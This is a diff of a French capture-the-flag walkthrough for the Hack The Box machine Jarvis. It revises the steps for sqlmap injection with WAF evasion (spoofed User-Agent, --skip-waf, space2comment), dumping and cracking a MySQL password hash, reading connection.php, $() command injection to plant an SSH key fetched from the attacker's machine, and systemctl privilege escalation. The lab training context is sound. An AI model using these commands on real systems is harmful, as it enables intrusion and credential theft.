@@ -648,9 +648,9 @@ Les vérifications manuelles montrent que le contenu retourné par l’applicati
 
 Tu utilises maintenant `sqlmap` afin de confirmer automatiquement cette vulnérabilité.
 
-Comme l’énumération a révélé la présence de phpMyAdmin, un environnement MySQL ou MariaDB constitue une hypothèse raisonnable. Tu orientes donc les premiers tests de `sqlmap` vers cette famille de SGBD.
+Comme l’énumération a révélé la présence de phpMyAdmin, un environnement MySQL ou MariaDB constitue une hypothèse raisonnable. Tu orientes donc les premiers tests vers cette famille de systèmes de gestion de base de données.
 
-Tu limites également les tests à la technique booléenne déjà observée, tout en réduisant la fréquence des requêtes afin de ne pas déclencher trop rapidement le mécanisme de protection du site :
+Tu limites également les essais à la technique booléenne déjà observée et réduis la fréquence des requêtes afin de ne pas solliciter inutilement le mécanisme de protection du site :
 
 ```bash
 sqlmap \
@@ -671,19 +671,25 @@ L’option `-p cod` demande à `sqlmap` de tester uniquement le paramètre `cod`
 
 L’option `--dbms=MySQL` limite les charges utiles à celles compatibles avec MySQL et MariaDB, tandis que `--technique=B` restreint la recherche aux injections SQL de type booléen.
 
-Les options `--level=1` et `--risk=1` conservent les niveaux de test les plus bas. Elles limitent le nombre de charges utiles testées et évitent les variantes les plus intrusives.
+Les options `--level=1` et `--risk=1` conservent les niveaux de test les plus faibles. Elles limitent le nombre de charges utiles envoyées et évitent les variantes les plus intrusives.
 
-Les options `--threads=1` et `--delay=1` imposent l’utilisation d’un seul thread et ajoutent une seconde d’attente entre les requêtes. Elles permettent ainsi de réduire le risque de bannissement par le mécanisme de protection détecté pendant l’énumération.
+Les options `--threads=1` et `--delay=1` imposent l’utilisation d’un seul thread et ajoutent une seconde d’attente entre les requêtes. Elles permettent ainsi de réduire le rythme des tests et le risque de déclencher le mécanisme de protection détecté pendant l’énumération.
 
-L’option `--skip-waf` empêche `sqlmap` d’exécuter son test préalable de détection des pare-feux applicatifs. Ce contrôle s’est révélé particulièrement reconnaissable et déclenchait immédiatement IronWAF. Cette option ne désactive pas le WAF : elle évite seulement ce test préliminaire.
+L’option `--skip-waf` empêche `sqlmap` d’exécuter son test préalable de détection des pare-feux applicatifs. Cette option ne désactive pas IronWAF : elle évite simplement une série de requêtes supplémentaires susceptibles d’attirer son attention.
 
 L’option `--batch` accepte automatiquement les réponses par défaut proposées par `sqlmap`.
 
-Enfin, `--flush-session` efface les résultats précédemment enregistrés par l’outil afin de forcer une nouvelle détection.
+Enfin, `--flush-session` supprime les résultats précédemment mémorisés pour cette cible afin de forcer une nouvelle détection.
 
-> **Remarque sur les blocages de `sqlmap`**
+Cette première commande constitue une base de travail. Son comportement n’est cependant pas parfaitement reproductible : selon l’état de la machine, les requêtes précédemment envoyées et la réaction d’IronWAF, elle peut confirmer partiellement l’injection, échouer à distinguer correctement les réponses ou provoquer temporairement des erreurs `404`.
+
+L’objectif n’est donc pas de suivre une succession rigide de commandes, mais de construire progressivement une configuration `sqlmap` adaptée au comportement observé.
+
+> **Remarque sur les blocages temporaires**
 >
-> Si le mécanisme de protection du site est déclenché, les requêtes peuvent recevoir une réponse `404` pendant environ 90 secondes. Avant de relancer `sqlmap`, vérifie depuis un autre terminal que la page répond de nouveau normalement :
+> Lorsque le mécanisme de protection du site est déclenché, les requêtes peuvent recevoir une réponse `404` pendant environ 90 secondes.
+>
+> Avant de relancer `sqlmap`, vérifie depuis un autre terminal que la page répond de nouveau normalement :
 >
 > ```bash
 > curl -s -o /dev/null \
@@ -691,54 +697,41 @@ Enfin, `--flush-session` efface les résultats précédemment enregistrés par l
 >   'http://jarvis.htb/room.php?cod=2'
 > ```
 >
-> Pendant le blocage :
+> Pendant un blocage, tu peux par exemple obtenir :
 >
 > ```text
 > code=404 length=54
 > ```
 >
-> Réponse normale :
+> Lorsque la page répond normalement :
 >
 > ```text
 > code=200 length=6131
 > ```
 >
-> Si `sqlmap` réutilise malgré tout une détection erronée, relance-le avec `--flush-session`.
->
-> En dernier recours, supprime uniquement les données enregistrées pour cette cible :
->
-> ```bash
-> rm -rf ~/.local/share/sqlmap/output/jarvis.htb
-> ```
->
-> Cette commande supprime également les fichiers déjà récupérés par `sqlmap`. Copie-les auparavant si tu souhaites les conserver.
+> Attends le retour d’une réponse normale avant de poursuivre les tests.
 
-Malgré la limitation à la technique booléenne, cette première tentative reste perturbée par IronWAF. Plusieurs réponses `404` sont retournées pendant les tests, ce qui empêche `sqlmap` de valider définitivement le point d’injection.
-
-La situation s’améliore lorsque tu remplaces le User-Agent par celui d’un navigateur Firefox sous Windows :
+Pour rendre les requêtes moins reconnaissables que celles envoyées avec la signature par défaut de `sqlmap`, tu utilises directement le User-Agent d’un navigateur Firefox sous Windows :
 
 ```bash
---user-agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0'
+sqlmap \
+  -u 'http://jarvis.htb/room.php?cod=2' \
+  -p cod \
+  --dbms=MySQL \
+  --technique=B \
+  --level=1 \
+  --risk=1 \
+  --user-agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0' \
+  --threads=1 \
+  --delay=1 \
+  --skip-waf \
+  --batch \
+  --flush-session
 ```
 
-Avec ce User-Agent, `sqlmap` observe le comportement attendu pour une injection booléenne :
+Cette modification peut améliorer le déroulement des tests, mais elle ne garantit pas à elle seule une détection stable. Selon la réaction d’IronWAF, `sqlmap` peut encore interrompre ses vérifications ou recommander l’utilisation d’un script tamper.
 
-```text
-GET parameter 'cod' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
-(with --string="Suite room is perfect")
-```
-
-L’outil identifie donc une chaîne caractéristique de la page retournée lorsque la condition injectée est vraie :
-
-```text
-Suite room is perfect
-```
-
-Cette découverte est importante. `sqlmap` pourra désormais déterminer plus facilement si une condition est vraie ou fausse en vérifiant simplement la présence ou l’absence de cette chaîne dans la réponse HTTP.
-
-La vérification finale reste toutefois interrompue par une réponse `404` d’IronWAF. `sqlmap` recommande alors notamment l’utilisation d’un script tamper comme `space2comment`.
-
-Tu testes cette recommandation :
+Lorsque l’outil le suggère, tu peux donc effectuer un nouvel essai avec `space2comment` :
 
 ```bash
 sqlmap \
@@ -757,23 +750,7 @@ sqlmap \
   --flush-session
 ```
 
-Le script `space2comment` remplace les espaces présents dans les charges utiles SQL par des commentaires.
-
-Une charge utile conceptuellement proche de :
-
-```sql
-cod=2 AND 8851=8851
-```
-
-est ainsi transmise sous une forme ressemblant à :
-
-```sql
-cod=2/**/AND/**/8851=8851
-```
-
-Cette transformation modifie la signature de la requête sans changer son sens pour le serveur MySQL.
-
-Cette fois, `sqlmap` parvient à terminer la vérification et confirme l’injection :
+Selon l’état du filtrage, ce tamper peut permettre à `sqlmap` d’aller plus loin dans ses vérifications et de confirmer l’injection :
 
 ```text
 Parameter: cod (GET)
@@ -782,15 +759,32 @@ Parameter: cod (GET)
     Payload: cod=2 AND 8851=8851
 ```
 
-La sortie précise toutefois que le payload présenté ne montre pas les modifications réellement appliquées par le tamper :
+Il ne faut cependant pas conclure que `space2comment` est systématiquement nécessaire. Selon les essais, il peut être utile, rester sans effet ou ne plus être requis une fois une configuration plus fiable obtenue.
+
+Cette phase consiste donc à procéder par essais et erreurs :
+
+- lancer la commande de base ;
+- utiliser directement le User-Agent Firefox sous Windows ;
+- ajouter `space2comment` lorsque `sqlmap` le recommande ;
+- retirer le tamper s’il n’améliore pas les résultats ;
+- attendre la fin d’un éventuel blocage avant chaque nouvelle tentative.
+
+Au cours de ces tests, `sqlmap` identifie une chaîne caractéristique de la page retournée lorsque la condition injectée est vraie :
 
 ```text
-changes made by tampering scripts are not included in shown payload content(s)
+Suite room is perfect
 ```
 
-Le script `space2comment` permet donc de confirmer la vulnérabilité. Il reste néanmoins à vérifier s’il est indispensable ou si la chaîne découverte précédemment suffit à stabiliser la détection.
+L’outil peut notamment afficher :
 
-Tu relances alors `sqlmap` sans tamper, mais en lui fournissant explicitement le marqueur de réponse vraie :
+```text
+GET parameter 'cod' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
+(with --string="Suite room is perfect")
+```
+
+Cette découverte fournit un moyen plus fiable de distinguer les réponses vraies des réponses fausses. Au lieu de comparer globalement deux pages dont certains éléments peuvent varier, `sqlmap` peut vérifier directement la présence ou l’absence de cette chaîne.
+
+Tu construis alors une commande finale en conservant les options qui ont donné les résultats les plus stables et en fournissant explicitement le marqueur avec `--string` :
 
 ```bash
 sqlmap \
@@ -811,13 +805,56 @@ sqlmap \
 
 L’option `--string='Suite room is perfect'` demande à `sqlmap` de considérer la présence de cette chaîne comme le signe d’une réponse vraie.
 
-Cette fois, l’outil va jusqu’au terme de la vérification sans utiliser de script tamper :
+Voici le résultat de cette commande :
+
+```bash
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.10.6#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 10:26:21 /[date]/
+
+[10:26:21] [INFO] flushing session file
+[10:26:21] [INFO] testing connection to the target URL
+[10:26:22] [INFO] testing if the provided string is within the target URL page content
+you have not declared cookie(s), while server wants to set its own ('PHPSESSID=vp4ej0b6jl2...etsl7nnsj7'). Do you want to use those [Y/n] Y
+[10:26:23] [WARNING] heuristic (basic) test shows that GET parameter 'cod' might not be injectable
+[10:26:24] [INFO] testing for SQL injection on GET parameter 'cod'
+[10:26:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[10:26:30] [INFO] GET parameter 'cod' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
+[10:26:30] [INFO] checking if the injection point on GET parameter 'cod' is a false positive
+GET parameter 'cod' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 13 HTTP(s) requests:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=2 AND 5030=5030
+---
+[10:26:38] [INFO] testing MySQL
+[10:26:39] [INFO] confirming MySQL
+[10:26:43] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 9 (stretch)
+web application technology: PHP, Apache 2.4.25
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+[10:26:44] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/jarvis.htb'
+
+[*] ending @ 10:26:44 /[date]/
+
+```
+
+Avec cette configuration, l’outil distingue correctement les deux états de la page et confirme que le paramètre `cod` est injectable :
 
 ```text
 GET parameter 'cod' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
 ```
 
-Il confirme ensuite définitivement que le paramètre est vulnérable :
+Il valide ensuite définitivement la vulnérabilité :
 
 ```text
 GET parameter 'cod' is vulnerable
@@ -829,16 +866,18 @@ Le point d’injection identifié est le suivant :
 Parameter: cod (GET)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: cod=2 AND 1515=1515
+    Payload: cod=2 AND 5030=5030
 ```
 
 La charge utile générée ajoute une égalité toujours vraie :
 
 ```text
-cod=2 AND 1515=1515
+cod=2 AND 5030=5030
 ```
 
-L’application continue alors d’afficher les informations de la chambre. Grâce au marqueur fourni avec `--string`, `sqlmap` peut comparer cette réponse aux pages obtenues avec des conditions fausses et confirmer que le contenu retourné dépend bien du résultat de l’expression injectée.
+L’application continue alors d’afficher les informations de la chambre. Pour une égalité fausse, la chaîne `Suite room is perfect` disparaît de la réponse.
+
+Grâce au marqueur fourni avec `--string`, `sqlmap` peut donc déterminer de manière fiable le résultat de l’expression injectée.
 
 L’outil identifie également le système de gestion de base de données utilisé :
 
@@ -846,17 +885,17 @@ L’outil identifie également le système de gestion de base de données utilis
 back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
 ```
 
-L’injection SQL du paramètre `cod` est donc confirmée. Il s’agit d’une injection de type **boolean-based blind** sur un serveur MySQL utilisant un fork MariaDB.
+L’injection SQL du paramètre `cod` est ainsi confirmée. Il s’agit d’une injection de type **boolean-based blind** sur un serveur MySQL utilisant un fork MariaDB.
 
-Les essais montrent également que le tamper `space2comment` peut faciliter le passage à travers IronWAF, mais qu’il n’est pas indispensable ici. La combinaison suivante suffit à obtenir une détection stable :
+La commande finale ne résulte pas d’une procédure entièrement déterministe. Elle est obtenue après plusieurs essais avec le User-Agent Firefox sous Windows, l’utilisation éventuelle du tamper `space2comment` lorsque `sqlmap` le recommande et l’identification d’un marqueur fiable pour les réponses vraies.
+
+Dans les conditions rencontrées ici, la configuration retenue repose finalement sur les éléments suivants :
 
 ```text
-User-Agent Firefox Windows
+User-Agent Firefox sous Windows
 --skip-waf
 --string='Suite room is perfect'
 ```
-
-Le User-Agent Firefox rend les requêtes moins reconnaissables que celles envoyées avec la signature par défaut de `sqlmap`, `--skip-waf` évite le test préalable qui déclenche IronWAF, et `--string` fournit un marqueur fiable pour distinguer les réponses vraies des réponses fausses.
 
 #### Recherche d’une technique d’injection plus efficace
 
@@ -956,48 +995,7 @@ Parameter: cod (GET)
     Payload: cod=-9360 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(...),NULL,NULL-- -
 ```
 
-Pour construire une requête UNION valide, `sqlmap` doit d’abord déterminer le nombre de colonnes retournées par la requête originale.
-
-L’outil constate que la technique `ORDER BY` peut être utilisée pour effectuer cette vérification :
-
-```text
-'ORDER BY' technique appears to be usable
-```
-
-Il identifie ensuite une requête composée de sept colonnes :
-
-```text
-target URL appears to have 7 columns in query
-```
-
-Le payload généré respecte donc cette structure :
-
-```sql
-UNION ALL SELECT
-    NULL,
-    NULL,
-    NULL,
-    NULL,
-    <donnée injectée>,
-    NULL,
-    NULL
-```
-
-La valeur contrôlée est placée dans la cinquième colonne, ce qui indique que cette position permet à `sqlmap` de retrouver le résultat injecté dans la réponse HTTP.
-
-La valeur négative utilisée pour le paramètre `cod` :
-
-```text
-cod=-9360
-```
-
-évite que la première partie de la requête retourne une chambre existante. Le résultat produit par la partie `UNION SELECT` peut ainsi apparaître seul dans la page et être identifié plus facilement.
-
-`sqlmap` termine ensuite le contrôle du faux positif et confirme définitivement la vulnérabilité :
-
-```text
-GET parameter 'cod' is vulnerable
-```
+Tu constates que `sqlmap` identifie une requête composée de sept colonnes et construit une requête `UNION SELECT` compatible avec cette structure.
 
 L’application est donc vulnérable à deux techniques d’injection SQL :
 
@@ -1006,11 +1004,9 @@ boolean-based blind
 UNION query
 ```
 
-La technique booléenne reste exploitable, mais elle nécessite de reconstruire les données caractère par caractère à l’aide de nombreuses requêtes.
+La technique booléenne reste exploitable, mais elle nécessite de reconstruire les données progressivement au moyen de nombreuses requêtes.
 
-L’injection UNION permet au contraire de retourner directement les résultats dans la réponse HTTP. Elle est donc beaucoup plus rapide et mieux adaptée à la suite de l’exploitation.
-
-Tu conserves désormais cette technique, beaucoup plus rapide que l’injection boolean-based blind.
+L’injection UNION te permet au contraire de récupérer directement les résultats dans la réponse HTTP. Elle est donc beaucoup plus rapide et tu la privilégies pour la suite de l’exploitation.
 
 ### Exploitation de l'injection SQLi Union
 
@@ -1096,52 +1092,30 @@ database management system users password hashes:
 [*] ending @ 10:34:13 /[date]/
 ```
 
-La session enregistrée est correctement réutilisée :
+`sqlmap` réutilise la session enregistrée et reprend directement l’injection UNION déjà confirmée :
 
 ```text
 sqlmap resumed the following injection point(s) from stored session:
 ```
 
-`sqlmap` reprend donc directement l’injection UNION précédemment confirmée, sans recommencer toute la détection.
-
-L’outil récupère ensuite les hash associés aux comptes MySQL :
-
-```text
-[INFO] fetching database users password hashes
-```
-
-Un seul compte est identifié :
-
-```text
-DBadmin
-```
-
-Le hash récupéré est le suivant :
+Tu récupères ensuite le hash du compte MySQL `DBadmin` :
 
 ```text
 *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
 ```
 
-`sqlmap` reconnaît le format du hash MySQL et propose de lancer une attaque par dictionnaire :
-
-```text
-using hash method 'mysql_passwd'
-```
-
-Tu choisis le dictionnaire fourni par défaut avec l’outil. Quelques secondes plus tard, le mot de passe est retrouvé :
+`sqlmap` reconnaît ce format et retrouve rapidement le mot de passe :
 
 ```text
 cracked password 'imissyou' for user 'DBadmin'
 ```
 
-Le résultat final est donc :
+Les identifiants obtenus sont donc :
 
 ```text
 Utilisateur MySQL : DBadmin
 Mot de passe       : imissyou
 ```
-
-L’injection UNION permet ainsi de récupérer rapidement les informations d’authentification du compte MySQL utilisé par l’application.
 
 L’énumération avait également révélé la présence d’un fichier nommé `connection.php`. Dans une application PHP, un fichier portant ce nom est susceptible de contenir les paramètres utilisés pour établir la connexion à la base de données. Il constitue donc une cible intéressante à lire.
 
@@ -1218,39 +1192,25 @@ files saved to [1]:
 
 
 
-La session enregistrée est correctement réutilisée :
+`sqlmap` réutilise la session enregistrée et reprend directement l’injection UNION déjà confirmée :
 
 ```text
 sqlmap resumed the following injection point(s) from stored session:
 ```
 
-`sqlmap` reprend donc directement l’injection UNION déjà confirmée, sans recommencer toute la phase de détection.
-
-L’outil tente ensuite de lire le fichier demandé :
+L’outil lit ensuite le fichier `/var/www/html/connection.php` :
 
 ```text
 [INFO] fetching file: '/var/www/html/connection.php'
 ```
 
-Quelques secondes plus tard, il confirme que le fichier distant et sa copie locale possèdent exactement la même taille :
-
-```text
-the local file '/home/kali/.local/share/sqlmap/output/jarvis.htb/files/_var_www_html_connection.php' and the remote file '/var/www/html/connection.php' have the same size (75 B)
-```
-
-La lecture est donc complète. Le fichier est enregistré localement ici :
-
-```text
-/home/kali/.local/share/sqlmap/output/jarvis.htb/files/_var_www_html_connection.php
-```
-
-Tu peux afficher son contenu avec :
+La copie locale obtenue fait bien 75 octets, comme le fichier distant. Tu peux l’afficher avec :
 
 ```bash
 cat ~/.local/share/sqlmap/output/jarvis.htb/files/_var_www_html_connection.php
 ```
 
-Le fichier contient les informations suivantes :
+Son contenu confirme les identifiants MySQL :
 
 ```php
 <?php
@@ -1464,7 +1424,7 @@ Après avoir appuyé sur `Entrée`, tu réinitialises le terminal :
 reset
 ```
 
-Tu indiques `xterm`, puis tu définis la variable correspondante :
+Tu réponds `xterm`, puis tu définis la variable correspondante :
 
 ```bash
 export TERM=xterm
@@ -1819,7 +1779,7 @@ La commande devient donc, en pratique, quelque chose de proche de :
 ping uid=1000(pepper) gid=1000(pepper) groups=1000(pepper)
 ```
 
-Comme cette valeur n’est pas une adresse IP valide, `ping` tente d’interpréter certains éléments comme des noms d’hôtes et finit par afficher une erreur :
+Comme cette valeur ne correspond pas à une adresse IP valide, `ping` tente d’en interpréter certains éléments comme des noms d’hôtes avant d’afficher une erreur, après une dizaine de secondes.
 
 ```text
 ping: groups=1000(pepper): Temporary failure in name resolution
@@ -1894,7 +1854,15 @@ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
 $(/tmp/install_pepper_key.sh)
 ```
 
-Le script est alors exécuté avec les privilèges de `pepper`. Il crée son répertoire `.ssh`, télécharge la clé publique et applique les permissions attendues.
+Le script est alors exécuté avec les privilèges de `pepper`. Il crée son répertoire `.ssh`, télécharge la clé publique et applique les permissions attendues. 
+
+Une fois la clé publique récupérée sur Jarvis, n’oublie pas d’arrêter le serveur HTTP lancé sur Kali :
+
+```bash
+Ctrl+C
+```
+
+Le serveur Python sur le port `8000` n’est plus nécessaire après le transfert.
 
 Depuis Kali, tu sécurises la clé privée :
 
@@ -2082,8 +2050,6 @@ Active ensuite le service et démarre-le immédiatement :
 ```bash
 /bin/systemctl enable --now "$TF"
 ```
-
-L’option `enable` configure le service pour qu’il soit associé à la cible définie dans la section `[Install]`, tandis que l’option `--now` demande son démarrage immédiat.
 
 Tu peux alors vérifier si le fichier `/tmp/output` a bien été créé :
 
